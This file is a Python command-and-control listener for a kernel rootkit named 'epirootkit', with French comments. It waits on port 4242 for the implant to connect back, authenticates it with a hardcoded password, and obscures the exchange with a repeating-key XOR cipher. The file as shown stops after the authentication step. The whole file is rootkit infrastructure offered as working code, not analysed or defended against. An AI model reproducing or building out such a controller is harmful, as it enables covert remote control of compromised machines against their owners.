import socket

KEY = b"epirootkit"
HOST = "0.0.0.0"
PORT = 4242

def xor(data: bytes) -> bytes:
    return bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(data))

def handle_client(client):
    try:
        # Envoyer le mot de passe chiffré
        password = b"epirootkit\n"  # Doit correspondre exactement au password dans le module kernel
        encrypted_pass = xor(password)
        client.sendall(encrypted_pass)

        # Recevoir et déchiffrer la réponse
        auth_response_encrypted = client.recv(2048)
        auth_response = xor(auth_response_encrypted).decode(errors="ignore")
        print("--- AUTH ---")
        print(auth_response.strip())
        print("------------\n")

        if "FAIL" in auth_response:
            print("Authentication failed. Exiting.")
            return
    except Exception as e:
        print(f"Error handling client: {e}")
        return

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((HOST, PORT))
        server.listen(1)
        print(f"[*] Waiting for connection on {HOST}:{PORT}...")

        client, addr = server.accept()
        print(f"[+] Connection from {addr[0]}:{addr[1]}")

        handle_client(client)

if __name__ == "__main__":
    main()